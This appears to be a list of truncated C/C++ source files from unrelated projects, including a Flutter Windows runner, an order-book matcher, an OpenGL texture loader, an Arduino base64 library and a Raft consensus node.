    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"expense_tracker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"libary.h\"\n\nenum class OrderType\n{\n\tGoodTillCancel,  // holds till user says no and cancels the damn order\n\tFillandKill // completely execute the entire order immediately (fill) or cancel the entire order (kill) if it cannot be filled immediately. (have time constrains)\n};\n\nenum class Side\n{\n\tBuy,\n\tSell\n};\n\n\nusing Price = std::int32_t;\nusing Quantity = std::uint32_t;\nusing OrderID = std::uint64_t; // string here?\n\nstruct LevelInfo\n{\n\tPrice price_;\n\tQuantity quantity_;\n};\n\nusing LevelInfos = std::vector<LevelInfo>;\n\nclass OrderbookLevelInfos\n{\npublic:\n\tOrderbookLevelInfos(const LevelInfos& bids, const LevelInfos& asks)\n\t\t: bids_{ bids }\n\t\t, asks_{ asks }\n\t{ }\n\n\tconst LevelInfos& GetBids() const { return bids_; }\n\tconst LevelInfos& GetAsks() const { return asks_; }\n\nprivate:\n\tLevelInfos bids_;\n\tLevelInfos asks_;\n};\n\nclass Order\n{\npublic:\n    Order(OrderType orderType, OrderID orderID, Side side, Price price, Quantity quantity)\n        : orderType_{ orderType }, orderID_{ orderID }, side_{ side },\n        price_{ price }, initialQuantity_{ quantity }, remainingQuantity_{ quantity } {}\n\n    OrderType GetOrderType() const { return orderType_; }\n    OrderID GetOrderID() const { return orderID_; }\n    Side GetSide() const { return side_; }\n    Price GetPrice() const { return price_; }\n    Quantity GetInitialQuantity() const { return initialQuantity_; }\n    Quantity GetRemainingQuantity() const { return remainingQuantity_; }\n    Quantity GetFilledQuantity() const { return GetInitialQuantity() - GetRemainingQuantity(); }\n    bool isFilled() const { return  GetRemainingQuantity() == false;  }\n    void Fill(Quantity quantity)\n    {\n        if (quantity > GetRemainingQuantity())\n        {\n            std::ostringstream oss;\n            oss << \"Order (\" << GetOrderID() << \") cannot be filled for more than its remainder quantity.\";\n            throw std::logic_error(oss.str());\n        }\n\n        remainingQuantity_ -= quantity;\n    }\n\nprivate:\n    OrderType orderType_;\n    OrderID orderID_;\n    Side side_;\n    Price price_;\n    Quantity initialQuantity_;\n    Quantity remainingQuantity_;\n};\n\nusing OrderPointer = std::shared_ptr<Order>;\nusing OrderPointers = std::list<OrderPointer>;\n\nclass OrderModify\n{\npublic :\n    OrderModify(OrderID orderID, Side side, Price price, Quantity quantity)\n        : orderID_{ orderID }\n        , price_{ price }\n        , side_{ side }\n        , quantity_{ quantity }\n    { }\n\n    OrderID GetOrderID() const { return orderID_; }\n    Side GetSide() const { return side_; }\n    Price GetPrice() const { return price_; }\n    Quantity GetQuantity() const { return quantity_; }\n\n    OrderPointer ToOrderPointer( OrderType type  ) const\n    {\n        return std::make_shared<Order>(type, GetOrderID(), GetSide(), GetPrice(), GetQuantity());\n    }\n\nprivate:\n    OrderID orderID_;\n    Price price_;\n    Side side_;\n    Quantity quantity_;\n};\n\n\nstruct TradeInfo //interface for tthe trade\n{\n    OrderID orderID_;\n    Price price_;\n    Quantity quantity_;\n};\n\nclass Trade // aggreaation of bid and ask sides.\n{\npublic:\n    Trade (const TradeInfo& bidTrade, const TradeInfo& askTrade)\n        : bidTrade_ {bidTrade}\n        , askTrade_ {askTrade}\n    { }\n\n    const TradeInfo& GetBidTrade() const { return bidTrade_; }\n    const TradeInfo& GetAskTrade() const { return askTrade_; }\n\nprivate:\n    TradeInfo bidTrade_;\n    TradeInfo askTrade_;\n\n\n};\n\n\nusing Trades = std::vector<Trade>;\n\nclass Orderbook\n{\nprivate:\n    //using a map for bids (in descending from best bid ) and ask (ascending for best ask) we can have O(N) access . \n    // order iterator for its location \n    struct OrderEntry\n    {\n        OrderPointer order_{ nullptr };\n        OrderPointers::iterator location_;\n\n    };\n\n\n    std::map<Price, OrderPointers, std::greater<Price>> bids_;\n    std::map<Price, OrderPointers, std::less<Price>> asks_;\n    std::unordered_map<OrderID, OrderEntry> orders_;\n\n    //match methods\n    // so we add an order, if its not f&k we add to the list, else if it doesnt match , we discard instantly\n\n    bool CanMatch(Side side, Price price) const\n    {\n        if (side == Side::Buy)\n        {\n            if (asks_.empty())\n                return false;\n\n            const auto& [bestAsk, _] = *asks_.begin();\n            return price >= bestAsk;\n        }\n        else\n        {\n            if (bids_.empty())\n                return false;\n\n            const auto& [bestBid, _] = *bids_.begin();\n            return price <= bestBid;\n        }\n    }\n\n    Trades MatchOrders()\n    {\n        Trades trades;\n        trades.reserve(orders_.size());\n\n        while (true)\n        {\n            if (bids_.empty() || asks_.empty())\n                break;\n\n            auto& [bidPrice, bids] = *bids_.begin();\n            auto& [askPrice, asks] = *asks_.begin();\n\n            if (bidPrice < askPrice)\n                break;\n\n            while (!bids.empty() && !asks.empty())\n            {\n                auto bid = bids.front();\n                auto as",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Texture.h\"\n#include \"CommonValues.h\"\n\n\nTexture::Texture()\n{\n\ttextureID = 0;\n\twidth = 0;\n\theight = 0;\n\tbitDepth = 0;\n\tfileLocation = 0;\n}\nTexture::Texture(const char *FileLoc)\n{\n\ttextureID = 0;\n\twidth = 0;\n\theight = 0;\n\tbitDepth = 0;\n\tfileLocation = FileLoc;\n}\n\nbool Texture::LoadTextureA()\n{\n\t//para cambiar el origen a la esquina inferior izquierda como necesitamos\n\tstbi_set_flip_vertically_on_load(true);\n\tunsigned char *texData = stbi_load(fileLocation, &width, &height, &bitDepth,STBI_rgb_alpha); //el tipo unsigned char es para un array de bytes de la imagen, obtener datos de la imagen \n\tif (!texData)\n\t{\n\t\tprintf(\"No se encontr\u00f3 el archivo: %s\", fileLocation);\n\t}\n\tglGenTextures(1, &textureID); //parecido al VAO: crear una textura y asignarle un \u00edndice\n\tglBindTexture(GL_TEXTURE_2D, textureID);//se indica que la textura es de tipo 2D, para superficies planas es suficiente esta textura\n\t\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);// eje S paralelo a X, repetir sobre el eje\n/*\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_MIRRORED_REPEAT);// eje S paralelo a X, repetir sobre el eje pero rotando con forme a un centro\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP);// eje S paralelo a X, envolver toda la superficie\n*/\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);// eje T paralelo a Y, repetir sobre el eje\n\t/*GL_TEXTURE_MIN_FILTER: Para m\u00e1s cerca o textura se escala a menor tama\u00f1o. GL_TEXTURE_MAG_FILTER: Para m\u00e1s lejos o textura se escala a mayor tama\u00f1o. \n\tGL_LINEAR  aplica sampling y blending de texels m\u00e1s cercanos. GL_NEAREST aplica sample de texel m\u00e1s cercano\n\t*/\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\t//glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);\n\t//if(RGBA) {\n\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, texData);\n\tglGenerateMipmap(GL_TEXTURE_2D);\n\t/*}else{\n\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, texData)\n\tglGenerateMipmap(GL_TEXTURE_2D); */\n\tglBindTexture(GL_TEXTURE_2D, 0);//para hacer un unbind de la textura\n\tstbi_image_free(texData); //para liberar la informaci\u00f3n de la imagen\n\treturn true;\n}\nbool Texture::LoadTexture()\n{\n\t//para cambiar el origen a la esquina inferior izquierda como necesitamos\n\tstbi_set_flip_vertically_on_load(true);\n\tunsigned char *texData = stbi_load(fileLocation, &width, &height, &bitDepth, 0); //el tipo unsigned char es para un array de bytes de la imagen, obtener datos de la imagen \n\tif (!texData)\n\t{\n\t\tprintf(\"No se encontr\u00f3 el archivo: %s\", fileLocation);\n\t}\n\tglGenTextures(1, &textureID); //parecido al VAO: crear una textura y asignarle un \u00edndice\n\tglBindTexture(GL_TEXTURE_2D, textureID);//se indica que la textura es de tipo 2D, para superficies planas es suficiente esta textura\n\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);// eje S paralelo a X, repetir sobre el eje\n/*\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_MIRRORED_REPEAT);// eje S paralelo a X, repetir sobre el eje pero rotando con forme a un centro\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP);// eje S paralelo a X, envolver toda la superficie\n*/\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);// eje T paralelo a Y, repetir sobre el eje\n\t/*GL_TEXTURE_MIN_FILTER: Para m\u00e1s cerca o textura se escala a menor tama\u00f1o. GL_TEXTURE_MAG_FILTER: Para m\u00e1s lejos o textura se escala a mayor tama\u00f1o.\n\tGL_LINEAR  aplica sampling y blending de texels m\u00e1s cercanos. GL_NEAREST aplica sample de texel m\u00e1s cercano\n\t*/\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\t//glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);\n\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, texData);\n\tglGenerateMipmap(GL_TEXTURE_2D);\n\tglGenerateMipmap(GL_TEXTURE_2D);\n\tglBindTexture(GL_TEXTURE_2D, 0);//para hacer un unbind de la textura\n\tstbi_image_free(texData); //para liberar la informaci\u00f3n de la imagen\n\treturn true;\n}\nvoid Texture::ClearTexture()\n{\n\n\tglDeleteTextures(1, &textureID);\n\ttextureID = 0;\n\twidth = 0;\n\theight = 0;\n\tbitDepth = 0;\n\tfileLocation = \"\";\n}\nvoid Texture::UseTexture()\n{\t//UnitTexture\n\tglActiveTexture(GL_TEXTURE0); //para crear un sampler que es lo que necesitan los shaders para poder acceder a la textura: 16 a 32 texturas pueden ser declaradas\n\t//si hay mas de 1 unittexture se tiene que crear una unifromvariable que haga cambio entre la unit texture a utilizar\n\tglBindTexture(GL_TEXTURE_2D, textureID);\n\n}\n\nTexture::~Texture()\n{\n\tClearTexture();\n}\n",
    "/*\n * Copyright (c) 2013 Adam Rudd.\n * See LICENSE for more information\n * https://github.com/adamvr/arduino-base64 \n */\n#if (defined(__AVR__))\n#include <avr\\pgmspace.h>\n#else\n#include <pgmspace.h>\n#endif\n\nconst char PROGMEM b64_alphabet[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\t\t\"abcdefghijklmnopqrstuvwxyz\"\n\t\t\"0123456789+/\";\n\n/* 'Private' declarations */\ninline void a3_to_a4(unsigned char * a4, unsigned char * a3);\ninline void a4_to_a3(unsigned char * a3, unsigned char * a4);\ninline unsigned char b64_lookup(char c);\n\nint base64_encode(char *output, char *input, int inputLen) {\n\tint i = 0, j = 0;\n\tint encLen = 0;\n\tunsigned char a3[3];\n\tunsigned char a4[4];\n\n\twhile(inputLen--) {\n\t\ta3[i++] = *(input++);\n\t\tif(i == 3) {\n\t\t\ta3_to_a4(a4, a3);\n\n\t\t\tfor(i = 0; i < 4; i++) {\n\t\t\t\toutput[encLen++] = pgm_read_byte(&b64_alphabet[a4[i]]);\n\t\t\t}\n\n\t\t\ti = 0;\n\t\t}\n\t}\n\n\tif(i) {\n\t\tfor(j = i; j < 3; j++) {\n\t\t\ta3[j] = '\\0';\n\t\t}\n\n\t\ta3_to_a4(a4, a3);\n\n\t\tfor(j = 0; j < i + 1; j++) {\n\t\t\toutput[encLen++] = pgm_read_byte(&b64_alphabet[a4[j]]);\n\t\t}\n\n\t\twhile((i++ < 3)) {\n\t\t\toutput[encLen++] = '=';\n\t\t}\n\t}\n\toutput[encLen] = '\\0';\n\treturn encLen;\n}\n\nint base64_decode(char * output, char * input, int inputLen) {\n\tint i = 0, j = 0;\n\tint decLen = 0;\n\tunsigned char a3[3];\n\tunsigned char a4[4];\n\n\n\twhile (inputLen--) {\n\t\tif(*input == '=') {\n\t\t\tbreak;\n\t\t}\n\n\t\ta4[i++] = *(input++);\n\t\tif (i == 4) {\n\t\t\tfor (i = 0; i <4; i++) {\n\t\t\t\ta4[i] = b64_lookup(a4[i]);\n\t\t\t}\n\n\t\t\ta4_to_a3(a3,a4);\n\n\t\t\tfor (i = 0; i < 3; i++) {\n\t\t\t\toutput[decLen++] = a3[i];\n\t\t\t}\n\t\t\ti = 0;\n\t\t}\n\t}\n\n\tif (i) {\n\t\tfor (j = i; j < 4; j++) {\n\t\t\ta4[j] = '\\0';\n\t\t}\n\n\t\tfor (j = 0; j <4; j++) {\n\t\t\ta4[j] = b64_lookup(a4[j]);\n\t\t}\n\n\t\ta4_to_a3(a3,a4);\n\n\t\tfor (j = 0; j < i - 1; j++) {\n\t\t\toutput[decLen++] = a3[j];\n\t\t}\n\t}\n\toutput[decLen] = '\\0';\n\treturn decLen;\n}\n\nint base64_enc_len(int plainLen) {\n\tint n = plainLen;\n\treturn (n + 2 - ((n + 2) % 3)) / 3 * 4;\n}\n\nint base64_dec_len(char * input, int inputLen) {\n\tint i = 0;\n\tint numEq = 0;\n\tfor(i = inputLen - 1; input[i] == '='; i--) {\n\t\tnumEq++;\n\t}\n\n\treturn ((6 * inputLen) / 8) - numEq;\n}\n\ninline void a3_to_a4(unsigned char * a4, unsigned char * a3) {\n\ta4[0] = (a3[0] & 0xfc) >> 2;\n\ta4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);\n\ta4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);\n\ta4[3] = (a3[2] & 0x3f);\n}\n\ninline void a4_to_a3(unsigned char * a3, unsigned char * a4) {\n\ta3[0] = (a4[0] << 2) + ((a4[1] & 0x30) >> 4);\n\ta3[1] = ((a4[1] & 0xf) << 4) + ((a4[2] & 0x3c) >> 2);\n\ta3[2] = ((a4[2] & 0x3) << 6) + a4[3];\n}\n\ninline unsigned char b64_lookup(char c) {\n\tif(c >='A' && c <='Z') return c - 'A';\n\tif(c >='a' && c <='z') return c - 71;\n\tif(c >='0' && c <='9') return c + 4;\n\tif(c == '+') return 62;\n\tif(c == '/') return 63;\n\treturn -1;\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <thread>\n#include <sstream>\n#include <chrono>\n#include <mutex>\n#include <condition_variable>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <random> \n#include <cmath>\n#include <cstring>\n#include <unistd.h>\n\nenum class NodeState {\n    Follower,\n    Candidate,\n    Leader\n};\n\nenum class MessageType {\n    RequestVote,\n    VoteResult,\n    AppendEntries,\n    AppendEntriesResponse,\n    ClientMessage,\n    GetChatLog,\n    CrashProcess,\n    CrashNotice,\n    ForwardMsg,\n    Unknown\n};\n\nstruct Message {\n    MessageType type;\n    int messageID;\n    int senderID;\n    std::string content;\n    int term;\n};\n\nstruct LogEntry {\n    int term;\n    int messageID;\n    std::string command;\n    int confirmations = 1;\n    LogEntry(int t, int messageID, std::string cmd): term(t), messageID(messageID), command(std::move(cmd)) {}\n};\n\nclass StateMachine {\npublic:\n    std::vector<std::string> chat_history;\n    void apply(const std::string& command) {\n        chat_history.push_back(command);\n        std::cout << \"applied to state machine: \" << command << std::endl;\n    }\n};\n\nclass RaftNode {\nprivate:\n    NodeState state;\n    StateMachine state_machine;\n    int term;\n    int id;\n    int port;\n    int base_port;\n    int n_process;\n    int alive_n_process;\n    int leader_id = -1;\n    int votes_received = 0;\n    int vote_for = -1;\n    int max_index = -1;\n    bool reset_requested {false};\n    bool stop {false};\n    std::mutex mtx;\n    std::mutex vr_mtx;\n    std::condition_variable cv;\n    std::condition_variable log_cv;\n    std::vector<std::thread> threads;\n    std::atomic<bool> runningHeartbeatTimer{false};\n    std::thread heartbeat_thread;\n    std::unordered_map<int, bool> node_status;\n    std::vector<LogEntry> log;\n    std::mt19937 rng{std::random_device{}()};\n    std::uniform_int_distribution<std::mt19937::result_type> dist{1500, 3000};\n\n\n    void heartBeatTimer() {\n        std::cout << id << \": Heartbeat timer started.\" << std::endl;\n        try {\n            while(runningHeartbeatTimer) {\n                std::this_thread::sleep_for(std::chrono::milliseconds(500));\n                if (!runningHeartbeatTimer) {\n                    std::cout << id << \": Heartbeat timer stopping as flag is false.\" << std::endl;\n                    break;\n                }\n                sendHeartBeats();\n            }\n        } catch (const std::exception& e) {\n            std::cerr << id << \": Exception in heartbeat timer: \" << e.what() << std::endl;\n        }\n        std::cout << id << \": Heartbeat timer exited.\" << std::endl;\n    }\n\n    void startHeartbeatTimer() {\n        runningHeartbeatTimer = true;\n        heartbeat_thread = std::thread(&RaftNode::heartBeatTimer, this);\n    }\n\n    void stopHeartbeatTimer() {\n        runningHeartbeatTimer = false;\n        if(heartbeat_thread.joinable()) {\n            heartbeat_thread.join();\n        }\n    }\n\n    void sendMessageToNode(int node_id, const std::string& message, bool close_immediately = true, int timeout_ms = 1000, int max_retries = 3) {\n        std::string state_str = (state == NodeState::Follower) ? \"Follower\" :\n                                (state == NodeState::Candidate) ? \"Candidate\" : 